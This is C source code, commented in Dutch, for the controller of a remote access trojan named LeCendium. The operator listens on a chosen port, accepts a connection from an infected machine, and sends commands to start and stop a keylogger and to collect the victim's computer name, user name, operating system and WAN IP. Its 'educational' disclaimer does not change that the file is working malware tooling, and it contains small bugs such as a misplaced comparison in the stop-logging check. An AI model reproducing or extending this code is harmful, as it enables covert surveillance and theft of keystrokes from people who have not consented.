#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>


struct sockaddr_in serv_addr, cli_addr;
int sock_fd=0, newsock_fd=0,clilen=0,n=0;

void ErrorMessage(const char *msg) {
	perror(msg);
}

int Shell() {

	char command[1024];
	char help[1024] = "help";
	char close[1024] = "sluit";
	char info[1024] = "info";
	char clear[1024] = "clear";
	char print[1024] = "print";

	char start_log[1024] = "start_loggen";
	char stop_log[1024] = "stop_loggen";
	char output[1024];
	int is_running = 0;

	char HELP[1024] = "\n\n   LeCendium is een RAT, gemaakt door © Incendium voor educatieve doeleinden.\n\n    LeCendium COMMANDO'S :\n\n   [ help - Print dit menu ]\n   [ info - Vraag Target Info Op ]\n   [ clear - Cleared De Terminal ]\n   [ start_loggen - Begin de Keylogger ]\n   [ stop_loggen - Stop de Keylogger ]\n   [ sluit - Sluit de Connectie ]\n  --------------------------------\n\n";

	char COMPUTER[1024];
	char USER[1024];
	char OS[1024];
	char WANIP[1024];

	char *p=getenv("USER");
	sleep(1);

	printf("   [>>] Shell Sessie Succesvol Gecreërd!\n\n   toets 'help' in voor de commandos!\n");

	while(1) {

			printf(" [>>] %s@%s:~$ ", p, inet_ntoa(cli_addr.sin_addr));
			bzero(command, 1024);
			fgets(command, 1024, stdin);

			if(strncmp(command, help, strlen(help)) == 0) {
					printf(HELP);
			}

			else if(strncmp(command, close, strlen(close)) == 0) {
					n = write(newsock_fd, close, strlen(close));
					printf("   [>>] Shell Sessie Sluiten...\n        Gelukt! Tot ziens.\n ");
					exit(1);
			}

			else if(strncmp(command, start_log, strlen(start_log)) == 0) {
				if (is_running == 0) {
					printf("   [>>] Logging Sessie Wordt Gestart...\n");	
					n = write(newsock_fd, start_log, strlen(start_log));	
					n = read(newsock_fd, output, 1024);
					if(strncmp(output, "START", 5) == 0) {
						printf("   [>>] Het Loggen Is Succesvol Gestart!\n");
					is_running = 1;
					}
					
					else {
						printf("   [!!] Het Loggen Is Verkeerd Gegaan\n");
					}
				}

				else if (is_running == 1) {
					printf("   [>>] De Logger Runt Al!\n");
				}
				
				bzero(output, 1024);
			}

			else if(strncmp(command, stop_log, strlen(stop_log)) == 0) {
				if (is_running == 1) {
					printf("   [>>] Logging Sessie Wordt Gestopt\n");
					n = write(newsock_fd, stop_log, strlen(stop_log));
					n = read(newsock_fd, output, 1024);
					if (strncmp(output, "STOP", 4 == 0)) {
						printf("   [>>] Loggen Is Gestopt!\n");
					is_running = 0;
					}
					
					else {
						printf("   [>>] Fout Bij Het Stoppen Van Loggen!\n");
					}
				}
				
				else if (is_running == 0) {
					printf("   [>>] De Logger Runt Niet!\n");
				}

				bzero(output, 1024);
			}



			else if(strncmp(command, info, strlen(info)) == 0) {
					bzero(command, 1024);
					printf("   [>>] Aan het wachten voor Info.\n");
		

					if(n<0)
						ErrorMessage("	[!!] Fout met schrijven naar Socket!\n");

					n = read(newsock_fd, COMPUTER, 1024);
					n = read(newsock_fd, USER, 1024);
					n = read(newsock_fd, OS, 1024);
					n = read(newsock_fd, WANIP, 1024);

					printf(" 	ComputerNaam 	    -- %s\n", COMPUTER);
					printf(" 	GebruikersNaam      -- %s\n", USER);
					printf(" 	BesturingsSysteem   -- %s\n", OS);
					printf(" 	WAN IP		    -- %s\n", WANIP);

			}

			else if(strncmp(command, clear, strlen(clear)) == 0) {
					system("clear");
			}

			else {
					printf(" 	[!!] Ongeldig Commando!\n");
			}
	   }
}





int Server(){

		char ports[1024];
		int pid;
		int optval = 1;
		sock_fd=socket(AF_INET,SOCK_STREAM, 0);
		int i;

		if(setsockopt(sock_fd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) <0) {
				printf("   [!!] Error Bij Het Zetten Van TCP Socket Opties!\n");
				return 1;
		}

		if (sock_fd<0)
			fprintf(stderr,"   [!!] Error Bij Het Openen Van De Socket Handle!\n");

		bzero((char *) &serv_addr, sizeof(serv_addr));
		printf("\n    LeCendium is een RAT, gemaakt door © Incendium voor educatieve doeleinden.\n    Wanneer je vanaf hier doorgaat, accepteer je dat ik niet verantwoordelijk ben voor jouw acties die jij uitvoert met dit programma!\n\n");
		printf("   [>>] Port Om Connectie Te Maken: ");
		fgets(ports, BUFSIZ, stdin);

		int port = atoi(ports);

		serv_addr.sin_family=AF_INET;
		serv_addr.sin_port = htons(port);
		serv_addr.sin_addr.s_addr = INADDR_ANY;

		if (bind(sock_fd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) <0)
				ErrorMessage(" 	[!!] Fout Bij Binding!\n");

		listen(sock_fd, 5);

		printf("   [>>] Wachten Op Inkomende Connecties...\n");

		clilen = sizeof(cli_addr);

		newsock_fd = accept(sock_fd, (struct sockaddr *) &cli_addr, &clilen);

		if(newsock_fd<0)
				printf("   [!!] Error Bij Het Accepteren Van De Connectie!\n");

		printf("   [>>] Connectie Van %s!\n", inet_ntoa(cli_addr.sin_addr));
		printf("   [>>] Beginnen Met Shellsessie!\n");
		Shell();
		return 0;

}


int main(void) {

		Server();
}


